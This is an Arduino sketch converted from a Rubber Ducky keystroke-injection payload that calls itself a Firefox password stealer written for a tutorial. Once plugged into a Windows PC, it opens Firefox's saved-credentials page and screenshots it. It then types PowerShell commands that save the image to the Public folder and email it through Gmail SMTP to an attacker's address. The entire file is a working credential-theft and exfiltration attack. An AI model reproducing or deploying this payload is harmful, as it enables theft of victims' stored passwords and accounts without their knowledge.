/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Author: @nickgodshall/koufax
  // Rubber Ducky Firefox Password Stealer
  // Target: Windows 10/Firefox V 66.0.2
  // Description: Opens firefox, navigates to prefernces page and screenshots the saved user credentials. Then
  // saves screenshot to public user and emails the screenshot to your email. Written for the Null Byte tutorial
  // Remember to replace all instances of [SENDER EMAIL] [SENDER PASSWORD] and [RECEIVER EMAIL] to their
  // appropriate values
  delay(2000);
  // ------------- Open Firefox -------------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("firefox"));

  delay(1000);
  typeKey(KEY_RETURN);

  delay(4000);
  // ------------- Navigate to preferences page and views passwords -------------
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('l');
  Keyboard.releaseAll();
  delay(250);
  Keyboard.print(F("about:preferences#privacy"));

  typeKey(KEY_RETURN);

  delay(500);
  for(int i = 0; i < 14; i++) {
    typeKey(KEY_TAB);
  }

  typeKey(KEY_RETURN);

  delay(250);
  for(int i = 0; i < 3; i++) {
    typeKey(KEY_TAB);
  }

  typeKey(KEY_RETURN);

  delay(250);
  typeKey(KEY_RETURN);

  delay(500);
  typeKey(206);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // ------------ Save screenshot as png ------------
  delay(100);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(250);
  Keyboard.print(F("powershell"));

  delay(250);
  typeKey(KEY_RETURN);

  delay(250);
  Keyboard.print(F("$screenshot = gcb -Format Image"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$path = 'C:\\Users\\Public\\passwords.png'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$screenshot.Save($path, 'png')"));

  typeKey(KEY_RETURN);

  // ------------Email Screenshot as an Attachment ------------
  // ------------ Enter email credentials here ------------
  Keyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.EnableSsl = $true"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL', 'SENDER PASSWORD');"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.From = 'SENDER EMAIL'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.To.Add('RECEIVER EMAIL')"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.Subject = 'USER CREDENTIALS'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.Body = 'Here are the usernames I found for you.'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.Attachments.Add('C:\\Users\\Public\\passwords.png')"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.Send($ReportEmail)"));

  typeKey(KEY_RETURN);

  delay(3000);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
